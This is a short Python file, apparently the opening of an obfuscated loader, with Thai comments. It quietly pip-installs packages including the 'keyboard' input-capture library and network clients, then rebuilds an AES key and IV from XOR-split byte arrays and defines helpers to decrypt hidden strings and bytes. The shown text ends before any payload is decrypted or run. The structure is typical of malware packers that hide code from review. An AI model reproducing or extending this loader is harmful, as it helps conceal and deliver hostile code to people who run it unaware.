
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['keyboard', 'subprocess', 'httpx', 'ctypes', 'rich', 'dataclasses', 're', 'typing', 'requests', 'asyncio', 'hashlib', 'os', 'base64', 'ujson', 'datetime']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\xb3\x00\xcd\xf0\x91\t\x88c\x163h)1\xd7\xa2\n+\x95\xc5UN\xd4\xc4\xbb\x9e\xd3\xd5\x9e\xfa\xf7\xc5\xb7', b'\xdd\xe6u\xe7\xda4\xb5\xfd\x94\xaa\xaen\xb2S\xee\xb6\xbb\xc7\xffMA\xc0:\x18\xfc\xbd\x1e\xd1\x99\x95:\x02', b'@\xfc\xa2~D\xfb\xea\xcf\x19;%:,\xf8bP\xb1o\xfd\xb8\r\xe2\xfb\xa1\xa4\xd7f\xc1K\xb6\xca\xa0'])
_I = _xor([b'\xc7\xd0\x17m\x9c.\xd1{\xce8\xec\x08\x12\x99a*', b'\x14\x0c\xebB\x83/\xd5\x99\x90\xd2\x95\xb7\xe0CT\xe1'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

